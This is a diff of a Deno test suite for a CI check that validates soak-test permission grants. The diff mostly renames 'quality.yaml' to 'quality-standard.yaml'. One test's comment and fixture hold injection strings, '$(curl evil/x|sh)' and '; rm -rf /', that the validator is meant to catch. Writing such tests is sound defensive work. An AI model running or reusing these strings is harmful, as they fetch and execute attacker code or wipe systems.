@@ -22,7 +22,7 @@ async function writeExtension(
   opts: {
     testTask: string;
     propertyFile?: string; // relative to <ext>/, defaults to a well-formed anchored path
-    qualityYaml?: string; // full quality.yaml text; omit for "no quality.yaml at all"
+    qualityYaml?: string; // full quality-standard.yaml text; omit for "no quality-standard.yaml at all"
   },
 ): Promise<void> {
   const dir = join(root, name);
@@ -38,11 +38,11 @@ async function writeExtension(
   await Deno.mkdir(dirname(full), { recursive: true });
   await Deno.writeTextFile(full, "");
   if (opts.qualityYaml !== undefined) {
-    await Deno.writeTextFile(join(dir, "quality.yaml"), opts.qualityYaml);
+    await Deno.writeTextFile(join(dir, "quality-standard.yaml"), opts.qualityYaml);
   }
 }
 
-/** A minimal, otherwise-fully-compliant quality.yaml — check_soak.ts cares
+/** A minimal, otherwise-fully-compliant quality-standard.yaml — check_soak.ts cares
  * only about the `soak:` block, but needs a schema-shaped document to read
  * one from, so every fixture mirrors check_compliance.test.ts's own
  * FULLY_COMPLIANT_YAML shape with an injected `soak:` block. */
@@ -190,14 +190,14 @@ Deno.test("checkSoak: surfaces MISSING FC_NUM_RUNS when soak.denoArgs has a scop
   }
 });
 
-Deno.test("checkSoak: surfaces a BROAD GRANT WITH NO quality.yaml soak: BLOCK (swamp-go-brr's real --allow-all, no override)", async () => {
+Deno.test("checkSoak: surfaces a BROAD GRANT WITH NO quality-standard.yaml soak: BLOCK (swamp-go-brr's real --allow-all, no override)", async () => {
   // The approved, EXACT definition of "broad": --allow-all, OR unscoped
   // --allow-run, OR unscoped --allow-net. Nothing else — in particular,
   // unscoped --allow-write/--allow-read and any SCOPED grant (including a
   // comma-scoped --allow-env) are NOT broad (see
   // scripts/lib/soak_permissions.test.ts's isBroadGrant tests for the full
   // matrix). swamp-go-brr's real test task is bare --allow-all — the widest
-  // possible grant — with no quality.yaml at all, so an unattended nightly
+  // possible grant — with no quality-standard.yaml at all, so an unattended nightly
   // soak would inherit it silently. check_soak.ts must flag that absence so
   // a human reviews/narrows it (exactly as swamp-go-brr's real,
   // already-accepted override in soak_permissions.test.ts does).
@@ -205,7 +205,7 @@ Deno.test("checkSoak: surfaces a BROAD GRANT WITH NO quality.yaml soak: BLOCK (s
   try {
     await writeExtension(root, "swamp-go-brr", {
       testTask: "deno test --permit-no-files --allow-all extensions/models/",
-      // deliberately NO quality.yaml at all — the common/default case.
+      // deliberately NO quality-standard.yaml at all — the common/default case.
     });
     const result = await checkSoak(root);
     const flagged = result.violations.filter((v: Violation) =>
@@ -232,7 +232,7 @@ Deno.test("checkSoak: does NOT flag an extension merely for needing extra (non-b
   // and a scoped --allow-read=bots/snake_bot.ts) — but neither is
   // --allow-all, unscoped --allow-run, nor unscoped --allow-net, so under
   // the approved narrow definition it is NOT a broad grant. Requiring a
-  // hand-written quality.yaml soak: override here (or for any of the other
+  // hand-written quality-standard.yaml soak: override here (or for any of the other
   // 23 extensions in the same shape) would be a 24-file scope explosion
   // that defeats PR B's premise: the test task is the source of truth, and
   // soak: is a RARE, human-reviewed narrowing exception — not a
@@ -244,7 +244,7 @@ Deno.test("checkSoak: does NOT flag an extension merely for needing extra (non-b
     await writeExtension(root, "flipper-zero", {
       testTask:
         "deno test --allow-env=FC_NUM_RUNS,HOME,SWAMP_DENO_PATH --allow-read=bots/snake_bot.ts extensions/models/",
-      // deliberately NO quality.yaml — none should be required.
+      // deliberately NO quality-standard.yaml — none should be required.
     });
     const result = await checkSoak(root);
     assertEquals(
@@ -386,9 +386,9 @@ Deno.test("checkSoak: does NOT flag a soak.denoArgs override that is bare --allo
   }
 });
 
-Deno.test("checkSoak: surfaces INADEQUATE FC_NUM_RUNS coverage on the DERIVED path — no quality.yaml override at all", async () => {
+Deno.test("checkSoak: surfaces INADEQUATE FC_NUM_RUNS coverage on the DERIVED path — no quality-standard.yaml override at all", async () => {
   // The HIGH finding this pins: validateSoakAdequacy used to run ONLY on the
-  // quality.yaml soak: override path. When an extension has no override at
+  // quality-standard.yaml soak: override path. When an extension has no override at
   // all (the default, 48/51-extension case), a scoped --allow-env omitting
   // FC_NUM_RUNS in its OWN test task used to slip through this gate clean,
   // then silently run its nightly soak at the small fallback iteration
@@ -400,7 +400,7 @@ Deno.test("checkSoak: surfaces INADEQUATE FC_NUM_RUNS coverage on the DERIVED pa
     await writeExtension(root, "widget", {
       testTask:
         "deno test --allow-env=SOME_OTHER_VAR --allow-read extensions/models/",
-      // deliberately NO quality.yaml at all.
+      // deliberately NO quality-standard.yaml at all.
     });
     const result = await checkSoak(root);
     assert(
@@ -414,9 +414,9 @@ Deno.test("checkSoak: surfaces INADEQUATE FC_NUM_RUNS coverage on the DERIVED pa
   }
 });
 
-Deno.test("checkSoak: surfaces an UNSAFE TOKEN on the DERIVED path — no quality.yaml override, the token comes straight from deno.json's test task", async () => {
+Deno.test("checkSoak: surfaces an UNSAFE TOKEN on the DERIVED path — no quality-standard.yaml override, the token comes straight from deno.json's test task", async () => {
   // The MEDIUM finding this pins: validateTokenSafety used to run ONLY
-  // against a quality.yaml soak.denoArgs override. A deno.json test task
+  // against a quality-standard.yaml soak.denoArgs override. A deno.json test task
   // token like --allow-read=$(curl evil/x|sh) used to round-trip through
   // parsePermissionSet -> permissionSetToArgs into the derived soak argv
   // with its unsafe characters intact and unflagged.
@@ -425,7 +425,7 @@ Deno.test("checkSoak: surfaces an UNSAFE TOKEN on the DERIVED path — no qualit
     await writeExtension(root, "widget", {
       testTask:
         "deno test --allow-read=x; rm -rf / --allow-env=FC_NUM_RUNS extensions/models/",
-      // deliberately NO quality.yaml at all.
+      // deliberately NO quality-standard.yaml at all.
     });
     const result = await checkSoak(root);
     assert(
@@ -457,7 +457,7 @@ Deno.test("checkSoak: surfaces an UNRECOGNIZED FLAG on the test task (an invente
     await writeExtension(root, "widget", {
       testTask:
         "deno test --totally-new-flag --allow-env=FC_NUM_RUNS extensions/models/",
-      // deliberately NO quality.yaml at all — the DERIVED path.
+      // deliberately NO quality-standard.yaml at all — the DERIVED path.
     });
     const result = await checkSoak(root);
     assert(
@@ -531,7 +531,7 @@ Deno.test("checkSoak: the REAL repo (this checkout) has zero soak-unrecognized-f
   );
 });
 
-Deno.test("checkSoak: an orphaned-property-file violation's ::error annotation points at the REAL offending file, not quality.yaml", async () => {
+Deno.test("checkSoak: an orphaned-property-file violation's ::error annotation points at the REAL offending file, not quality-standard.yaml", async () => {
   const root = await Deno.makeTempDir({
     prefix: "check-soak-annotation-file-",
   });
@@ -559,11 +559,11 @@ Deno.test("checkSoak: an orphaned-property-file violation's ::error annotation p
       out.includes(
         "::error file=orphanext/extensions/lib/orphanext_property_test.ts::",
       ),
-      `expected the annotation to point at the real orphaned file, not quality.yaml, got: ${out}`,
+      `expected the annotation to point at the real orphaned file, not quality-standard.yaml, got: ${out}`,
     );
     assert(
-      !out.includes("::error file=orphanext/quality.yaml::"),
-      `expected NO quality.yaml annotation for an orphaned-property-file violation, got: ${out}`,
+      !out.includes("::error file=orphanext/quality-standard.yaml::"),
+      `expected NO quality-standard.yaml annotation for an orphaned-property-file violation, got: ${out}`,
     );
   } finally {
     await Deno.remove(root, { recursive: true });
